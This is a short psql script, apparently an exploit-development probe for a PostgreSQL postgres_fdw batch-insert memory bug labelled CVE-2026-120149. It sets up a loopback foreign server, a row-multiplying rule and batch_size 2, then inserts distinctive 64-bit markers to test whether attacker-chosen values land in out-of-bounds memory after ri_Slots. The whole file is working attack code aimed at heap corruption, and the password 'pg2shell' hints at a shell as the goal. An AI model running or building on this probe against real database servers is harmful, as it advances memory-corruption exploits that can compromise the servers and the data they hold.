-- Chunk-placement probe for CVE-2026-120149 (loopback only, 2026-11-21).
-- Distinctive 64-bit markers are sent to the FDW; if SQL can place a chosen
-- 8-byte value in the arena chunk after ri_Slots, a marker (or its low half)
-- appears as an OOB slot word. batch_size=2, rule expands 2 rows into 24.
\set ON_ERROR_STOP off
CREATE EXTENSION IF NOT EXISTS postgres_fdw;
DROP FOREIGN TABLE IF EXISTS ftable;
DROP TABLE IF EXISTS batch_table, batch_rule_table;
CREATE TABLE batch_table (x bigint);
CREATE TABLE batch_rule_table (x bigint);
CREATE RULE batch_rule AS ON INSERT TO batch_table
  DO INSTEAD INSERT INTO batch_rule_table SELECT i FROM generate_series(1,12) i;
CREATE SERVER IF NOT EXISTS loopback FOREIGN DATA WRAPPER postgres_fdw
  OPTIONS (host '127.0.0.1', port '5432', dbname 'postgres');
CREATE USER MAPPING IF NOT EXISTS FOR postgres SERVER loopback
  OPTIONS (user 'postgres', password 'pg2shell');
CREATE FOREIGN TABLE ftable (x bigint) SERVER loopback
  OPTIONS (table_name 'batch_table', batch_size '2');
\echo == MARKER PROBE: 2 rows sent, rule reports 24, batch_size 2 ==
INSERT INTO ftable VALUES (4611686018427387905), (9223372036854775806);
\echo == END MARKER PROBE ==
